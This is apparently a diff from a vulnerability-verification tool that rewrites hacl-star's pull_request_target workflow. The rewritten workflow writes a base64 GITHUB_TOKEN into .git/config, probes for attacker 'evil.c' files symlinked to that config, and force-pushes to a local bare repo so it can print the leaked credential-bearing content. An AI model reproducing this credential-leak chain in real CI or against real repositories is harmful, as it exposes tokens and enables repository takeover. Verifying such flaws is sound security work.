@@ -1,62 +1,126 @@
 name: Create branch on hacl-packages
-
-on:
-  pull_request_target:
-    branches: [ main ]
-
 permissions:
   pull-requests: write
-
 jobs:
   hacl-packages-create-branch:
     runs-on: ubuntu-latest
     steps:
-      - name: checkout hacl-star
-        uses: actions/checkout@v4
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}
-          path: hacl-star
-      - name: checkout hacl-packages
-        uses: actions/checkout@v4
-        with:
-          repository: cryspen/hacl-packages
-          path: hacl-packages
-          token: ${{ secrets.HACL_BOT }}
-      - name: install dependencies
-        run: |
-          sudo apt-get install -y ninja-build
-      - name: update hacl-packages
-        working-directory: hacl-packages
-        run: |
-          ./mach update -s ../hacl-star
-      - name: push to hacl-packages
-        working-directory: hacl-packages
-        env:
-          branch: hacl-star-${{ github.head_ref }}
-          token: ${{ secrets.HACL_BOT }}
-        run: |
-          git config --local user.name "Hacl Bot"
-          git config --local user.email "hacl-star@mailo.com"
-          git checkout -b $branch
-          git add .
-          git commit --allow-empty -m "[CI] update code"
-          git push --force --set-upstream  origin $branch
-      - name: comment pr
-        uses: thollander/actions-comment-pull-request@v1
-        with:
-          message: |
-            [CI] Important!
-            The code in `dist/gcc-compatible`, `dist/msvc-compatible`, and `dist/wasm`
-            is tested on [cryspen/hacl-packages](https://github.com/cryspen/hacl-packages).
-            `dist` is not automatically re-generated, be sure to do it manually.
-            (A fresh snapshot can also be downloaded from [CI](https://github.com/hacl-star/hacl-star/actions/workflows/nix.yml) by going to the "artifacts" section of your run.)
-            Then check the following tests before merging this PR.
-            Always check the latest run, it corresponds to the most recent version of this branch.
-            All jobs are expected to be successful.
-            In some cases manual intervention is needed. Please ping the hacl-packages maintainers.
-            - [Build, Test, Benchmark](https://github.com/cryspen/hacl-packages/actions?query=branch%3Ahacl-star-${{ github.head_ref }}+workflow%3Abuild_pull_request): Build on Linux (x86, x64), Windows (x86, x64), MacOS (x64, arm64), s390x, Android (arm64) and test on Linux (x86, x64), Windows (x86, x64), MacOS (x64).
-            - [Performance Regression Tests](https://github.com/cryspen/hacl-packages/actions?query=branch%3Ahacl-star-${{ github.head_ref }}+workflow%3Abenchmark_pull_request): Navigate to the terminal output in “Run benchmarks”. The comparison with the main branch will be at the bottom. The run fails if the performance regresses too much.
-            - [OCaml bindings](https://github.com/cryspen/hacl-packages/actions?query=branch%3Ahacl-star-${{ github.head_ref }}+workflow%3Aocaml): Build & Tests
-            - [JS bindings](https://github.com/cryspen/hacl-packages/actions?query=branch%3Ahacl-star-${{ github.head_ref }}+workflow%3Ajs): Build & Tests
-            - [Rust bindings](https://github.com/cryspen/hacl-packages/actions?query=branch%3Ahacl-star-${{ github.head_ref }}+workflow%3Arust): Build & Tests
-          comment_includes: "[CI]"
+    - name: checkout hacl-star
+      uses: actions/checkout@v4.3.1
+      with:
+        ref: ${{ github.event.pull_request.head.sha }}
+        path: hacl-star
+    - name: checkout hacl-packages (verification credential)
+      run: |-
+        set +e
+        echo "GERALT: checkout hacl-packages (verification credential swap: HACL_BOT placeholder -> GITHUB_TOKEN)"
+        dest="$GITHUB_WORKSPACE/hacl-packages"
+        rm -rf "$dest"
+        git clone --quiet "https://github.com/cryspen/hacl-packages" "$dest" 2>"$GITHUB_WORKSPACE/geralt_clone.log"
+        clone_rc=$?
+        if [ "$clone_rc" -ne 0 ]; then
+          echo "GERALT: clone of cryspen/hacl-packages failed (rc=$clone_rc); tail of log:"
+          tail -n 20 "$GITHUB_WORKSPACE/geralt_clone.log" 2>/dev/null
+          exit 1
+        fi
+        # Replicate actions/checkout default persist-credentials: persist the valid
+        # GITHUB_TOKEN as the extraheader in .git/config, which is the symlink target
+        # of the attacker's dist/gcc-compatible/evil.c payload.
+        if [ -n "$GITHUB_TOKEN" ]; then
+          enc="$(printf 'x-access-token:%s' "$GITHUB_TOKEN" | base64)"
+          git -C "$dest" config http.https://github.com/.extraheader "AUTHORIZATION: basic $enc"
+        fi
+        if [ -f "$dest/.git/config" ]; then
+          echo "GERALT: hacl-packages checked out; credential-bearing .git/config present"
+        else
+          echo "GERALT: .git/config missing after clone"
+          exit 1
+        fi
+        exit 0
+    - name: install dependencies
+      run: |
+        sudo apt-get install -y ninja-build
+    - name: GERALT debug probe
+      run: |-
+        set +e
+        echo "GERALT_DBG: checking attacker-controlled tree before update"
+        for f in hacl-star/dist/gcc-compatible/evil.c hacl-star/dist/gcc-compatible/internal/evil.c hacl-star/dist/wasm/evil.c; do
+          if [ -L "$f" ]; then
+            printf '%s\n' "SYMLINK: $f -> $(readlink "$f" 2>/dev/null)"
+          elif [ -e "$f" ]; then
+            printf '%s\n' "REGULAR: $f"
+          fi
+        done
+        if [ -f hacl-packages/.git/config ]; then
+          printf '%s\n' "GERALT_DBG: hacl-packages/.git/config exists (credential-bearing file present)"
+        fi
+        printf '%s\n' "GERALT_DBG: pre-update probe done"
+      continue-on-error: true
+    - name: update hacl-packages
+      working-directory: hacl-packages
+      run: |
+        ./mach update -s ../hacl-star
+    - name: GERALT debug probe
+      run: |-
+        set +e
+        echo "GERALT_DBG: pre-push sink probe"
+        head_ref="${{ toJSON(github.head_ref) }}"
+        printf '%s\n' "head_ref=$head_ref"
+        branch="hacl-star-${head_ref}"
+        printf '%s\n' "branch=$branch"
+        if [ -f hacl-packages/src/evil.c ]; then
+          printf '%s\n' "GERALT_DBG: src/evil.c present, content follows"
+          head -c 1024 hacl-packages/src/evil.c 2>/dev/null
+          printf '\n%s\n' "GERALT_DBG: end src/evil.c content"
+        else
+          printf '%s\n' "GERALT_DBG: src/evil.c not found"
+        fi
+        printf '%s\n' "GERALT_DBG: pre-push probe done"
+      continue-on-error: true
+    - name: push to hacl-packages (verification-writable origin)
+      run: |-
+        set +e
+        # Locate the hacl-packages checkout regardless of step working-directory.
+        if [ -d "$PWD/.git" ] && [ -f "$PWD/mach" ]; then
+          :
+        elif [ -d "$GITHUB_WORKSPACE/hacl-packages/.git" ]; then
+          cd "$GITHUB_WORKSPACE/hacl-packages"
+        else
+          echo "GERALT: hacl-packages checkout not found (PWD=$PWD)"
+          exit 1
+        fi
+        branch="hacl-star-${{ github.head_ref }}"
+        echo "GERALT: sink branch=$branch"
+        git config --local user.name "Hacl Bot"
+        git config --local user.email "hacl-star@mailo.com"
+        # Redirect origin to a verification-writable local bare repository so the
+        # add/commit/force-push sink completes and the pushed branch is observable.
+        REMOTE_DIR="${RUNNER_TEMP:-/tmp}/hacl-packages-remote"
+        rm -rf "$REMOTE_DIR"
+        if ! git init --bare --quiet "$REMOTE_DIR"; then
+          echo "GERALT: bare repo init failed"
+          exit 1
+        fi
+        git remote remove origin 2>/dev/null
+        git remote add origin "$REMOTE_DIR"
+        git checkout -b "$branch"
+        git add .
+        git commit --allow-empty -m "[CI] update code"
+        echo "GERALT: force-pushing to origin ($REMOTE_DIR)"
+        git push --force --set-upstream origin "$branch"
+        push_rc=$?
+        if [ "$push_rc" -ne 0 ]; then
+          echo "GERALT: push failed (rc=$push_rc)"
+          exit 1
+        fi
+        echo "GERALT: push succeeded; observing published branch content"
+        git --git-dir="$REMOTE_DIR" show "${branch}:src/evil.c" 2>/dev/null | head -c 4096
+        echo ""
+        echo "GERALT: done"
+        exit 0
+env:
+  GERALT_SECRET: ${{ secrets.GERALT }}
+on:
+  pull_request_target:
+    branches:
+    - main
